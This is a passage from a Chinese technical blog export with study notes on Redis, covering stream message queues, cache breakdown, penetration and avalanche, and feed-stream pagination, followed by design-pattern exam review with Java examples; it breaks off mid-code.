<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">	<span class="type">Object</span> <span class="variable">msg</span> <span class="operator">=</span> redis.execute(<span class="string">&quot;XREAD COUNT 1 BLOCK 2000 STREAMS users $&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	handleMessage(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是当我们指定其实ID为$时，代表读取最新的消息，如果我们处理一条消息的过程中，又有超过1条以上的消息到达队列，则下次获取时也只能获取到最新的一条，会出现漏读消息的问题。</p>
<p>XREAD特点：</p>
<ul>
<li>消息可回溯</li>
<li>一个消息可以被多个消费者读取</li>
<li>可以阻塞读取</li>
<li>有消息漏读的风险</li>
</ul>
<h3 id="消费者组"><a href="#消费者组" class="headerlink" title="消费者组"></a>消费者组</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217151059108.png" alt="image-20250217151059108"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217151246998.png" alt="image-20250217151246998"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217151510267.png" alt="image-20250217151510267"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">	<span class="comment">// 尝试监听队列，使用阻塞模式，最长等待2000ms</span></span><br><span class="line">	<span class="type">Object</span> <span class="variable">msg</span> <span class="operator">=</span> redis.call(<span class="string">&quot;XREADGROUP GROUP g1 c1 COUNT 1 BLOCK 2000 STREAMS s1 &gt;&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (msg==<span class="literal">null</span>)&#123; <span class="comment">// null说明没有消息，继续下一次 </span></span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		handleMessage(msg);</span><br><span class="line">	&#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">			<span class="type">Object</span> <span class="variable">msg</span> <span class="operator">=</span> redis.call(<span class="string">&quot;XREADGROUP GROUP g1 c1 COUNT 1 STERAMS s1 0&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (msg == <span class="literal">null</span>)&#123;	<span class="comment">// null说明没有异常消息，所有消息都已确认，结束循环</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">try</span>&#123;</span><br><span class="line">				<span class="comment">//说明有异常消息，再次处理</span></span><br><span class="line">				handleMessage(msg);</span><br><span class="line">			&#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">				<span class="comment">// 再次出现异常，记录日志，继续循环</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>XREADGROUP特点：</p>
<ul>
<li>消息可回溯</li>
<li>可以多消费者争抢消息，加快消费速度</li>
<li>可以阻塞读取</li>
<li>没有消息漏洞的风险</li>
<li>有消息确认机制，保证消息至少被消费一次</li>
</ul>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217152914932.png" alt="image-20250217152914932" style="zoom:67%;" />
]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
        <tag>消息队列</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马点评项目实战（三）——缓存击穿</title>
    <url>/2024/02/15/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF/</url>
    <content><![CDATA[<h2 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h2><p>缓存击穿问题也叫热点Key问题，就是一个被高并发访问并且缓存重建业务较复杂的key突然失效了，无数的请求访问在瞬间给数据库带来巨大的冲击。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215165622778.png" alt="image-20250215165622778" style="zoom:67%;" />

<span id="more"></span>

<p>常见的解决方案有两种：互斥锁和逻辑过期。</p>
<h3 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215165828415.png" alt="image-20250215165828415"></p>
<p>线程A发现缓存过期，加锁重建缓存，后续线程阻塞直至线程A释放锁，此时缓存重建成功。</p>
<p>优点：</p>
<ul>
<li>没有额外的内存消耗</li>
<li>保证一致性</li>
<li>实现简单</li>
</ul>
<p>缺点：</p>
<ul>
<li>线程需要等待，性能受影响</li>
<li>可能有死锁风险</li>
</ul>
<p><strong>业务实现：</strong></p>
<p>关于如何加锁，这里使用redis的setmx（set if absent）来作为锁。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215170841707.png" alt="image-20250215170841707"></p>
<h3 id="逻辑过期"><a href="#逻辑过期" class="headerlink" title="逻辑过期"></a>逻辑过期</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215170304356.png" alt="image-20250215170304356" style="zoom: 50%;" />

<p>不设置过期时间，但在value中添加逻辑过期字段，线程A查询热点key发现value中逻辑时间过期，则线程A加锁并另起线程B重建缓存，线程A直接返回旧数据（不需等待线程B执行结束），后续线程C查询缓存发现过期后尝试加锁，如果加锁失败则说明有线程正在重建缓存，线程C也直接返回旧数据即可。</p>
<p>优点：</p>
<ul>
<li>线程无需等待，性能较好</li>
</ul>
<p>缺点：</p>
<ul>
<li>不保证一致性</li>
<li>有额外内存消耗</li>
<li>实现复杂</li>
</ul>
<p><strong>业务实现：</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215173044007.png" alt="image-20250215173044007"></p>
]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马点评项目实战（二）——缓存穿透与缓存雪崩</title>
    <url>/2024/02/15/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F%E4%B8%8E%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9/</url>
    <content><![CDATA[<h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><p>缓存穿透是指客户端请求的数据在缓存中和数据库中都不存在，这样缓存永远不会生效，这些请求都会打到数据库。例如，一个不怀好意的黑客同时间内大量请求不存在的数据，这些请求都会打到数据库上，导致数据库崩溃。</p>
<p>常见的解决方案有两种：缓存空对象和布隆过滤。</p>
<p>其他解决方案：增强id的复杂度，避免被猜测id规律；做好数据的基础格式校验；加强用户权限校验；做好热点参数的限流。</p>
<span id="more"></span>

<h3 id="缓存空对象"><a href="#缓存空对象" class="headerlink" title="缓存空对象"></a>缓存空对象</h3><ul>
<li>优点：实现简单，维护方便</li>
<li>缺点：<ul>
<li>额外的内存消耗（解决：设置TTL）</li>
<li>可能造成短期的不一致</li>
</ul>
</li>
</ul>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215152644339.png" alt="image-20250215152644339"></p>
<h3 id="布隆过滤"><a href="#布隆过滤" class="headerlink" title="布隆过滤"></a>布隆过滤</h3><ul>
<li><p>Redis中布隆过滤器底层为<strong>一个大型位数组（二进制数组）+多个无偏hash函数</strong></p>
</li>
<li><p>优点：内存占用较少，没有多余key</p>
</li>
<li><p>缺点：</p>
<ul>
<li>实现复杂</li>
<li>存在误判可能（可能有数据不存在但放行的情况）</li>
</ul>
</li>
</ul>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215152737924.png" alt="image-20250215152737924"></p>
<h3 id="业务实现（使用缓存空对象）"><a href="#业务实现（使用缓存空对象）" class="headerlink" title="业务实现（使用缓存空对象）"></a>业务实现（使用缓存空对象）</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215153518530.png" alt="image-20250215153518530"></p>
<h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><p>缓存雪崩是指在同一时段大量的缓存key同时失效或者Redis服务宕机，导致大量请求到达数据库，带来巨大压力。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215161713293.png" alt="image-20250215161713293" style="zoom:80%;" />

<p><strong>解决方案：</strong></p>
<ol>
<li><p>给不同的Key的TTL添加随机值，用以预防同一时段大量的缓存key同时失效</p>
</li>
<li><p>利用Redis集群提高服务的可用性</p>
</li>
<li><p>给缓存业务添加降级限流策略</p>
</li>
<li><p>给业务添加多级缓存</p>
</li>
</ol>
]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马点评项目实战（八）——Feed流</title>
    <url>/2024/02/19/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E5%85%AB%EF%BC%89%E2%80%94%E2%80%94Feed%E6%B5%81/</url>
    <content><![CDATA[<h2 id="Feed流"><a href="#Feed流" class="headerlink" title="Feed流"></a>Feed流</h2><p>关注推送也叫Feed流，通过无限下拉刷新获取新的信息。</p>
<p>常见两种模式：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250219145254241.png" alt="image-20250219145254241"></p>
<h2 id="Feed流的实现方案"><a href="#Feed流的实现方案" class="headerlink" title="Feed流的实现方案"></a>Feed流的实现方案</h2><h3 id="拉模式（读扩散）"><a href="#拉模式（读扩散）" class="headerlink" title="拉模式（读扩散）"></a>拉模式（读扩散）</h3><p>消息先发布到发件箱，收件箱一开始为空，关注者每次读取时拉取所有消息，然后按时间戳排序。</p>
<p>优点：节省内存空间，收件箱读取完后可以清空</p>
<p>缺点：每次读取需要重新拉消息并排序，耗时较久。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250219145345786.png" alt="image-20250219145345786"></p>
<h3 id="推模式（写扩散）"><a href="#推模式（写扩散）" class="headerlink" title="推模式（写扩散）"></a>推模式（写扩散）</h3><p>消息直接发送到每个关注者的收件箱，可以直接读取。</p>
<p>优点：不需要临时拉取，延迟低。</p>
<p>缺点：内存占用高，每个消息要写多份。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250219145658817.png" alt="image-20250219145658817"></p>
<h3 id="推拉结合模式（读写混合）"><a href="#推拉结合模式（读写混合）" class="headerlink" title="推拉结合模式（读写混合）"></a>推拉结合模式（读写混合）</h3><p>对于大V，采用拉模式，消息先发件箱，等待拉取。对于普通人，采用推模式，消息直接推到关注者的收件箱中。</p>
<p>对于活跃粉丝，采用推模式，所有人的消息（包括大V）都会直接发到其收件箱中。而对于普通粉丝，只有读取时才会去拉取消息。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250219150034653.png" alt="image-20250219150034653"></p>
<table>
<thead>
<tr>
<th></th>
<th>拉模式</th>
<th>推模式</th>
<th>推拉结合</th>
</tr>
</thead>
<tbody><tr>
<td><strong>写比例</strong></td>
<td>低</td>
<td>高</td>
<td>中</td>
</tr>
<tr>
<td><strong>读比例</strong></td>
<td>高</td>
<td>低</td>
<td>中</td>
</tr>
<tr>
<td><strong>用户读取延迟</strong></td>
<td>高</td>
<td>低</td>
<td>低</td>
</tr>
<tr>
<td><strong>实现难度</strong></td>
<td>复杂</td>
<td>简单</td>
<td>很复杂</td>
</tr>
<tr>
<td><strong>使用场景</strong></td>
<td>很少使用</td>
<td>用户量少，没有大V</td>
<td>过千万的用户量，有大V</td>
</tr>
</tbody></table>
<h2 id="Feed流的分页问题"><a href="#Feed流的分页问题" class="headerlink" title="Feed流的分页问题"></a>Feed流的分页问题</h2><p>Feed流中的数据会不断更新，所以数据的角标也在变化，因此不能采用传统的分页模式。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250219150931282.png" alt="image-20250219150931282"></p>
<h3 id="Feed流的滚动分页"><a href="#Feed流的滚动分页" class="headerlink" title="Feed流的滚动分页"></a>Feed流的滚动分页</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250219151027061.png" alt="image-20250219151027061"></p>
<p>为了实现滚动分页效果，使用redis中的sorted set数据结构来存储消息和时间戳。</p>
<p>使用命令 <strong>ZREVRANGEBYSCORE key max min WITHSCORES LIMIT offset count</strong></p>
<p>max：当前时间戳 | 上一次查询的最小时间戳</p>
<p>min：0</p>
<p>offset：0 |  上一次查询中，与最小值一样的元素个数</p>
<p>count：3</p>
]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
      </tags>
  </entry>
  <entry>
    <title>高级软件设计2024 期末复习</title>
    <url>/2024/12/25/%E9%AB%98%E7%BA%A7%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本篇复习参考了多个来源，因此可能会在一些细节上出现相互矛盾的地方，这时候需要多多思考和理解。</p>
<h3 id="策略模式-Strategy-Pattern"><a href="#策略模式-Strategy-Pattern" class="headerlink" title="策略模式 Strategy Pattern"></a>策略模式 Strategy Pattern</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241227154520757.png" alt="image-20241227154520757"></p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223153121545.png" alt="image-20241223153121545" style="zoom: 80%;" />

<p>策略模式定义了算法族，分别封装起来，让它们之间可以互相替换，此模式让算法的变化独立于使用算法的客户。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241227154630105.png" alt="image-20241227154630105"></p>
<span id="more"></span>

<h3 id="观察者模式-Observer-Pattern"><a href="#观察者模式-Observer-Pattern" class="headerlink" title="观察者模式 Observer Pattern"></a>观察者模式 Observer Pattern</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241224151011204.png" alt="image-20241224151011204"></p>
<p>观察者模式定义了对象之间的一对多依赖，这样依赖，当一个对象改变状态时，它的所有依赖着都会收到通知并自动更新。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Subject</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerObserver</span><span class="params">(Observer o)</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeObserver</span><span class="params">(Observer o)</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notifyObservers</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Observer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(<span class="type">float</span> temperature, <span class="type">float</span> humidity, <span class="type">float</span> pressure)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WeatherData</span> <span class="keyword">implements</span> <span class="title class_">Subject</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Observer&gt; observers;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">float</span> temperature;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">float</span> humidity;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">float</span> pressure;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WeatherData</span><span class="params">()</span> &#123;</span><br><span class="line">        observers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">   	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerObserver</span><span class="params">(Observer o)</span>&#123;</span><br><span class="line">        observers.add(o);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeObserver</span><span class="params">(Observer o)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> observers.indexOf(o);</span><br><span class="line">        <span class="keyword">if</span> (i&gt;=<span class="number">0</span>)</span><br><span class="line">            observers.remove(i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notifyObservers</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Observer o:observers)&#123;</span><br><span class="line">            o.update(temp,humidity,pressure);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">measurementsChanged</span><span class="params">()</span>&#123; <span class="comment">// 当从气象站得到更新时，通知观察者</span></span><br><span class="line">        notifyObservers();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMeasurements</span><span class="params">(<span class="type">float</span> temperature, <span class="type">float</span> humidity, <span class="type">float</span> pressure)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.temperature = temperature;</span><br><span class="line">        <span class="built_in">this</span>.humidity = humidity;</span><br><span class="line">        <span class="built_in">this</span>.pressure = pressure;</span><br><span class="line">        measurementsChanged();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DisplayElement</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CurrentConditionsDisplay</span> <span class="keyword">implements</span> <span class="title class_">Observer</span>, DisplayElement&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">float</span> temperature;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">float</span> humidity;</span><br><span class="line">    <span class="keyword">private</span> Subject weatherData;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CurrentConditionsDisplay</span><span class="params">(Subject weatherData)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.weatherData = weatherData;</span><br><span class="line">        weatherData.registerObserver(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(<span class="type">float</span> temperature, <span class="type">float</span> humidity, <span class="type">float</span> pressure)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.temperature = temperature;</span><br><span class="line">        <span class="built_in">this</span>.humidity = humidity;</span><br><span class="line">        display();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Current condition: &quot;</span> + temperature + <span class="string">&quot;F degrees and &quot;</span> + humidity + <span class="string">&quot;%humidity&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241227155358090.png" alt="image-20241227155358090"></p>
<h3 id="装饰者模式-Decorator-Pattern"><a href="#装饰者模式-Decorator-Pattern" class="headerlink" title="装饰者模式 Decorator Pattern"></a>装饰者模式 Decorator Pattern</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241224140904660.png" alt="image-20241224140904660"></p>
<p>装饰者模式动态地将责任附加到对象上。若要扩展功能，装饰者提供了比继承更有弹性的替代方案。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Beverage</span> &#123; </span><br><span class="line">	<span class="type">String</span> <span class="variable">description</span> <span class="operator">=</span> <span class="string">&quot;Unknown Beverage&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDescription</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> description;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">double</span> <span class="title function_">cost</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CondimentDecorator</span> <span class="keyword">extends</span> <span class="title class_">Beverage</span> &#123; <span class="comment">//抽象装饰者</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getDescription</span><span class="params">()</span>; <span class="comment">// 具体装饰者类需重新实现getDescription方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Espresso</span> <span class="keyword">extends</span> <span class="title class_">Beverage</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Espresso</span><span class="params">()</span>&#123;</span><br><span class="line">        description = <span class="string">&quot;Espresso&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">cost</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Milk</span> <span class="keyword">extends</span> <span class="title class_">CondimentDecorator</span>&#123; <span class="comment">//具体装饰者</span></span><br><span class="line">    Beverage beverage;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Milk</span><span class="params">(Beverage beverage)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.beverage = beverage;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">getDescription</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> beverage.getDescription() + <span class="string">&quot;, Milk&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">cost</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> beverage.cost() + <span class="number">0.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="JAVA-I-O类"><a href="#JAVA-I-O类" class="headerlink" title="JAVA I&#x2F;O类"></a><strong>JAVA I&#x2F;O类</strong></h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241224142208550.png" alt="image-20241224142208550"></p>
<p>编写一个装饰者类，将字母转为小写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LowerCaseInputStream</span> <span class="keyword">extends</span> <span class="title class_">FilterInputStream</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LowerCaseInputStream</span><span class="params">(InputSteam in)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="built_in">super</span>.read();</span><br><span class="line">        <span class="keyword">return</span> c==-<span class="number">1</span>? c: Character.toLowerCase((<span class="type">char</span>)c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">read</span><span class="params">(bytes[] b, <span class="type">int</span> offset, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">super</span>.read(b, offset, len);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i&lt;offset+result; i++)&#123;</span><br><span class="line">            b[i] = (<span class="type">byte</span>)Character.toLowerCase((<span class="type">char</span>)b[i]); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LowerCaseInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> 	<span class="title class_">FileInputStream</span>(<span class="string">&quot;test.txt&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>某系统提供一个数据加密功能，可以对字符串进行加密。最简单的加密算法通过对字母进行移位来实现，同时还提供稍复杂的逆向输出加密，还提供更为高级的求模加密。用户首先使用最简单的加密算法对字符串进行加密，如果觉得还不够可以对加密后的结果使用其他的加密算法进行二次加密，当然也可以进行第三次加密。使用Decrator模式来设计。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/v2-f0680586e1d6a16bc794827cce0d2416_1440w.jpg" alt="img" style="zoom:67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">EncryptComponent</span> &#123;</span><br><span class="line">    <span class="keyword">abstract</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OriginalEncrypt</span> <span class="keyword">extends</span> <span class="title class_">EncryptComponent</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;对字符串 \&#x27;&quot;</span>+str+<span class="string">&quot;\&#x27; 使用原始加密   =====&gt;  原始加密结果&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encryptStr</span> <span class="operator">=</span> <span class="string">&quot;原始加密结果&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> encryptStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncryptDecorator</span> <span class="keyword">extends</span> <span class="title class_">EncryptComponent</span> &#123;</span><br><span class="line">    EncryptComponent encryptComponent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EncryptDecorator</span><span class="params">(EncryptComponent encryptComponent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.encryptComponent = encryptComponent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> encryptComponent.encrypt(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OtherAEncrypt</span> <span class="keyword">extends</span> <span class="title class_">EncryptDecorator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OtherAEncrypt</span><span 